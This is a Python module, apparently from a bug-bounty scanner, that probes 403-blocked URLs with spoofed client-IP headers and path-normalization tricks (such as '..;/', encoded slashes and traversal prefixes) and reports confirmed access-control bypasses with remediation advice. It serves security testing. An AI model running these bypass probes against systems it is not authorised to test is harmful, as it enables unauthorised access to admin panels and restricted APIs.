"""
Aura v20.0 — 403 Bypass Engine (Phase 5)
Tests every 403-blocked endpoint using common header and path manipulation
techniques to discover hidden admin panels, restricted APIs, and access
controls that are improperly enforced.

A bypassed 403 → HIGH finding → $500-$3,000 on most bug bounty programs.
"""
import asyncio
import urllib.parse
from rich.console import Console
from aura.core import state

console = Console()


class BypassEngine:
    """
    Phase 5: 403 Forbidden Bypass Engine.
    Tests 8 header-based and path-normalization bypasses on blocked URLs.
    """

    # Headers that commonly bypass IP-based or path-based access controls
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
    ]

    # Path normalization tricks
    @staticmethod
    def _build_path_variants(path: str) -> list[str]:
        """Generates path normalization bypasses for a given path."""
        variants = []
        # Ensure path starts with /
        if not path.startswith("/"):
            path = "/" + path
        stem = path.rstrip("/")
        variants.extend([
            stem + "/",           # trailing slash
            stem + "/.",           # slash-dot trick
            stem + "%20",         # URL-encoded space
            stem + "%09",         # URL-encoded tab
            stem + "..;/",        # Tomcat bypass
            "/" + stem.lstrip("/").replace("/", "//"),  # double slash
            stem.replace("/", "/%2f"),    # encoded slash
            stem.replace("/", "/./"),     # dot-segment insertion
            "/.." + stem,                 # path traversal prefix
            "/api/.." + stem if not stem.startswith("/api") else stem,
        ])
        return list(set(variants))  # deduplicate

    def __init__(self, session=None):
        self.session = session

    async def _probe(self, url: str, headers: dict = None, method: str = "GET") -> int:
        """Makes a single HTTP request and returns the status code."""
        try:
            res = await self.session.get(url, headers=headers or {}, timeout=state.NETWORK_TIMEOUT)
            if res:
                return res.status_code
        except Exception:
            pass
        return 0

    async def bypass_url(self, url: str) -> list[dict]:
        """
        Attempts all bypass techniques on a single 403 URL.
        Returns a list of confirmed bypass findings.
        """
        if not self.session:
            return []

        findings = []
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        console.print(f"[yellow][Bypass] Testing {len(self.BYPASS_HEADERS)} header bypasses on {url}...[/yellow]")

        # ── Header-based bypasses ───────────────────────────────────────────
        for bypass_headers in self.BYPASS_HEADERS:
            status = await self._probe(url, headers=bypass_headers)
            if status == 200:
                header_name = list(bypass_headers.keys())[0]
                console.print(
                    f"[bold red][BYPASS CONFIRMED] 403 bypassed via header {header_name} on {url}[/bold red]"
                )
                findings.append(self._make_finding(
                    url=url,
                    technique=f"Header: {header_name}: {list(bypass_headers.values())[0]}",
                    extra=f"Server trusted {header_name} for IP-based access control. "
                          f"This allows any attacker to spoof a trusted internal IP."
                ))
                break  # One confirmation is enough

        # ── Path normalization bypasses ──────────────────────────────────────
        path_variants = self._build_path_variants(path)
        for variant_path in path_variants:
            variant_url = f"{base}{variant_path}"
            if variant_url == url:
                continue
            status = await self._probe(variant_url)
            if status == 200:
                console.print(
                    f"[bold red][BYPASS CONFIRMED] 403 bypassed via path normalization: {variant_url}[/bold red]"
                )
                findings.append(self._make_finding(
                    url=url,
                    technique=f"Path normalization: {variant_path}",
                    extra=f"The server resolved `{variant_path}` to the same resource as `{path}` "
                          f"but bypassed the access control applied to the canonical path."
                ))
                break

        return findings

    @staticmethod
    def _make_finding(url: str, technique: str, extra: str) -> dict:
        return {
            "type": "Access Control Bypass (403 Bypass)",
            "severity": "HIGH",
            "cvss_score": 8.1,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "owasp": "A01:2021-Broken Access Control",
            "mitre": "T1190 - Exploit Public-Facing Application",
            "content": (
                f"403 Bypass confirmed on: {url}\n"
                f"Technique: {technique}\n"
                f"Detail: {extra}"
            ),
            "remediation_fix": (
                "1. Do not rely on client-supplied headers (X-Forwarded-For, X-Real-IP) for access control.\n"
                "2. Enforce access controls based on the authenticated identity, not IP address.\n"
                "3. Normalize URL paths before applying access control rules.\n"
                "4. Use a centralized authorization middleware that processes the canonical URL.\n"
                "5. Regularly audit 403 responses with penetration testing tools."
            ),
            "impact_desc": (
                "An attacker can access protected admin panels, internal APIs, or restricted resources "
                "without authentication by manipulating HTTP headers or URL paths. "
                "This can lead to unauthorized data access, configuration changes, or full account takeover."
            ),
            "patch_priority": "HIGH",
            "evidence_url": url,
        }

    async def scan_403_list(self, forbidden_urls: list[str]) -> list[dict]:
        """
        Runs bypass attempts on a list of known 403 URLs.
        Call this after the main scanner collects all 403 responses.
        """
        if not forbidden_urls:
            return []

        console.print(
            f"[bold yellow][Bypass Engine] Testing {len(forbidden_urls)} blocked endpoints...[/bold yellow]"
        )
        all_findings = []
        for url in forbidden_urls:
            findings = await self.bypass_url(url)
            all_findings.extend(findings)

        if all_findings:
            console.print(
                f"[bold red][Bypass Engine] {len(all_findings)} bypass(es) confirmed![/bold red]"
            )
        else:
            console.print("[dim green][Bypass Engine] No 403 bypasses found.[/dim green]")

        return all_findings
